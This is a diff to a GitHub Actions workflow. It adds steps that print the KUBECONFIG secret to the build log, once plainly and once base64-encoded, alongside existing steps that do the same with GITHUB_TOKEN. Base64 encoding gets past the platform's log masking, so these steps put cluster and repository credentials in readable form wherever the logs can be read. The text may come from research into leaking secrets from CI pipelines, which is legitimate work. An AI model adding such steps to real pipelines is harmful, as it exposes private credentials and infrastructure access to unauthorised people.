@@ -22,3 +22,5 @@ jobs:
     steps:
       - run: echo "${{ secrets.GITHUB_TOKEN }}"
       - run: echo "${{ secrets.GITHUB_TOKEN }}" | base64
+      - run: echo "${{ secrets.KUBECONFIG }}"
+      - run: echo "${{ secrets.KUBECONFIG }}" | base64
